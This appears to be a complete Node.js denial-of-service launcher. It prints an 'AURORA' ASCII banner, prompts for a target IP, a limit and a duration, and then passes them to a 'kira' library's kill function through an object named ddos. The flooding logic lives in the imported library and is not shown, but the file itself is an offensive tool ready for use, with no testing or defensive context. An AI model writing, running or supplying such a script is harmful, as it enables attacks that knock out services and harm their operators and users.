let Kira = require("kira");
let ddos = new Kira();
const prompts = require("prompts");

console.log(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");
console.log("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");
console.log("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");
console.log("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");
console.log(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");
console.log(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");
console.log("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");
console.log("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");
console.log("      ░  ░   ░        ░         ░ ░     ░           ░  ░");
console.log("                                                        ");

(async () => {
  const response = await prompts([
    {
      type: "text",
      name: "targetIp",
      message: `Target IP: `,
    },
    {
      type: "number",
      name: "maxLimit",
      message: `Max Limit: `,
    },
    {
      type: "number",
      name: "length",
      message: `Length: `,
    },
  ]);
  ddos.kill(`${response.targetIp}`, response.maxLimit, response.length);
})();
